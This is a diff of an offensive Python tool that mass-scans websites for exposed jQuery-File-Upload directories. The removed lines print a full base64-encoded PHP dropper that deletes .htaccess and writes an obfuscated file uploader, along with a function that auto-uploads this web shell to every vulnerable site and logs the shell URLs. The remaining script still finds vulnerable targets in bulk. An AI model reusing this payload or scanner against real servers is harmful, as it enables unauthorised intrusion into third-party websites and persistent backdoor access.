@@ -8,31 +8,12 @@ from colorama import Fore, Style
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 headerx = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36'}
-base64asu = "PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwokZmFkID0gIi5odGFjY2VzcyI7CiRwYWQgPSBnZXRjd2QoKTsKaWYoIXVubGluaygkZmFkKSkgewplY2hvICgiJHBhZC9ldmFsZ2Fucy5waHAiKTt9ZWxzZSB7ZWNobyAoIiRwYWQvZXZhbGdhbnMucGhwIik7fQokcGVqdSA9IGZvcGVuKCJldmFsZ2Fucy5waHAiLCAidyIpIG9yIGRpZSgiVW5hYmxlIHRvIG9wZW4gZmlsZSEiKTsKJGtvbnRvbCA9IGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWldOb2J5SThjMk55YVhCMFBtUnZZM1Z0Wlc1MExuZHlhWFJsS0hWdVpYTmpZWEJsS0NjbE0wTWxOa1FsTmpVbE56UWxOakVsTWpBbE5rVWxOakVsTmtRbE5qVWxNMFFsTWpjbE56SWxOa1lsTmpJbE5rWWxOelFsTnpNbE1qY2xNakFsTmpNbE5rWWxOa1VsTnpRbE5qVWxOa1VsTnpRbE0wUWxNamNsTmtVbE5rWWxOamtsTmtVbE5qUWxOalVsTnpnbE1rTWxNakFsTmtVbE5rWWxOallsTmtZbE5rTWxOa01sTmtZbE56Y2xNamNsTTBVbE0wTWxOallsTmtZbE5rVWxOelFsTWpBbE5qTWxOa1lsTmtNbE5rWWxOeklsTTBRbE5qY2xOeklsTmpFbE56a2xNMFVsTjBJbE1qQWxORVlsTnpnbE5EWWxOakVsTmpRbE5rTWxOamtsTWpBbE4wTWxNakFsTkRrbE5qUWxOamtsTmtZbE56UWxNakFsTkRNbE56SWxOalVsTnpjbE1qQWxOMFFsTWpBbE5UVWxOekFsTmtNbE5rWWxOakVsTmpRbE5qVWxOeklsTWpBbE1rUWxNakFsTkRFbE5rVWxOelFsTmprbE1qQWxORFFsTXpBbE56SWxOa0lsTWpFbE5rVWxOamNsTTBNbE1rWWxOallsTmtZbE5rVWxOelFsTTBVbE0wTWxOaklsTnpJbE0wVW5LU2s4TDNOamNtbHdkRDRpTzJsbUtDUmZVRTlUVkNsN2FXWW9RR052Y0hrb0pGOUdTVXhGVTFzaU1DSmRXeUowYlhCZmJtRnRaU0pkTENSZlJrbE1SVk5iSWpBaVhWc2libUZ0WlNKZEtTbDdaV05vYnlJOGMyTnlhWEIwUG1SdlkzVnRaVzUwTG5keWFYUmxLSFZ1WlhOallYQmxLQ2NsTTBNbE5qWWxOa1lsTmtVbE56UWxNakFsTmpNbE5rWWxOa01sTmtZbE56SWxNMFFsTmpjbE56SWxOalVsTmpVbE5rVWxNMFVsTlRVbE56QWxOa01sTmtZbE5qRWxOalFsTWpBbE5qWWxOamtsTmtNbE5qVWxNakFsTmpJbE5qVWxOeklsTmpnbE5qRWxOek1sTmprbE5rTWxNakVsTTBNbE1rWWxOallsTmtZbE5rVWxOelFsTTBVbktTazhMM05qY21sd2RENGlPMzFsYkhObGUyVmphRzhpUEhOamNtbHdkRDVrYjJOMWJXVnVkQzUzY21sMFpTaDFibVZ6WTJGd1pTZ25KVE5ESlRZMkpUWkdKVFpGSlRjMEpUSXdKVFl6SlRaR0pUWkRKVFpHSlRjeUpUTkVKVGN5SlRZMUpUWTBKVE5GSlRVMUpUY3dKVFpESlRaR0pUWXhKVFkwSlRJd0pUWTJKVFk1SlRaREpUWTFKVEl3SlRZM0pUWXhKVEl3SlRZeUpUWTFKVGN5SlRZNEpUWXhKVGN6SlRZNUpUWkRKVEl4SlROREpUSkdKVFkySlRaR0pUWkZKVGMwSlRORkp5a3BQQzl6WTNKcGNIUStJanQ5ZldWc2MyVjdaV05vYnlJOGMyTnlhWEIwUG1SdlkzVnRaVzUwTG5keWFYUmxLSFZ1WlhOallYQmxLQ2NsTTBNbE5qWWxOa1lsTnpJbE5rUWxNakFsTmtRbE5qVWxOelFsTmpnbE5rWWxOalFsTTBRbE56QWxOa1lsTnpNbE56UWxNakFsTmpVbE5rVWxOak1sTnpRbE56a2xOekFsTmpVbE0wUWxOa1FsTnpVbE5rTWxOelFsTmprbE56QWxOakVsTnpJbE56UWxNa1lsTmpZbE5rWWxOeklsTmtRbE1rUWxOalFsTmpFbE56UWxOakVsTTBVbE0wTWxOamtsTmtVbE56QWxOelVsTnpRbE1qQWxOelFsTnprbE56QWxOalVsTTBRbE5qWWxOamtsTmtNbE5qVWxNakFsTmtVbE5qRWxOa1FsTmpVbE0wUWxNekFsTTBVbE0wTWxOamtsTmtVbE56QWxOelVsTnpRbE1qQWxOa1VsTmpFbE5rUWxOalVsTTBRbE16QWxNakFsTnpRbE56a2xOekFsTmpVbE0wUWxOek1sTnpVbE5qSWxOa1FsTmprbE56UWxNakFsTnpZbE5qRWxOa01sTnpVbE5qVWxNMFFsTlRVbE56QWxOa01sTmtZbE1qWWxNak1sTXprbE16Z2xNemdsTXpVbE5qUWxNakVsTTBVbktTazhMM05qY21sd2RENGlPMzAvUGc9PSIpOwpmd3JpdGUoJHBlanUsICRrb250b2wpOwpmY2xvc2UoJHBlanUpOwo/Pg=="
-php_code = base64.b64decode(base64asu).decode('utf-8')
-
-with open("evalganteng.php", "w") as file:
-    file.write(php_code)
 
 def clear():
     if system() == "Linux" or system() == "Darwin":
         os.system("clear")
     else:
         os.system("cls")
-
-def upload_file(session, url):
-    files = {'files[]': open('evalganteng.php', 'rb')}
-    try:
-        upload_url = f"{url}/files/"
-        response = session.post(upload_url, files=files, verify=False, headers=headerx)
-        if response.status_code == 200:
-            print(f'{Fore.GREEN}File berhasil diunggah: {upload_url}evalganteng.php{Fore.RESET}')
-            with open('jfu-shell.txt', 'a+') as f:
-                f.write(f'{upload_url}evalganteng.php\n')
-        else:
-            print(f'{Fore.RED}Gagal mengunggah file ke {upload_url}{Fore.RESET}')
-    except Exception as e:
-        print(f'{Fore.RED}Error saat mengunggah file: {str(e)}{Fore.RESET}')
 
 def main(url):
     s = requests.Session()
@@ -44,7 +25,6 @@ def main(url):
                 print(f'{Fore.GREEN}{url}/{i}{Fore.RESET}')
                 with open('jfu-res.txt', 'a+') as f:
                     f.write(f'{url}/{i}\n')
-                upload_file(s, f'http://{url}/{i}')
                 return True
             else:
                 print(f'{Fore.RED}{url}/{i}{Fore.RESET}')
@@ -59,7 +39,7 @@ if __name__ == "__main__":
     \ \/ _\ / / \ \ '_ \ / _ \| | | \ \    
  /\_/ / /   \ \_/ / |_) | (_) | |_| |\ \   
  \___/\/     \___/|_.__/ \___/ \__, \__/   
-{Fore.YELLOW}Mass JFU Scanner + Auto Upload{Fore.RESET} |___/                                         
+{Fore.YELLOW}Mass jQuery-File-Upload Scanner{Fore.RESET}|___/                                         
     ''')
     memekjembut = input("Website list (Without http/s): ")
     asu = open(memekjembut).read().splitlines()
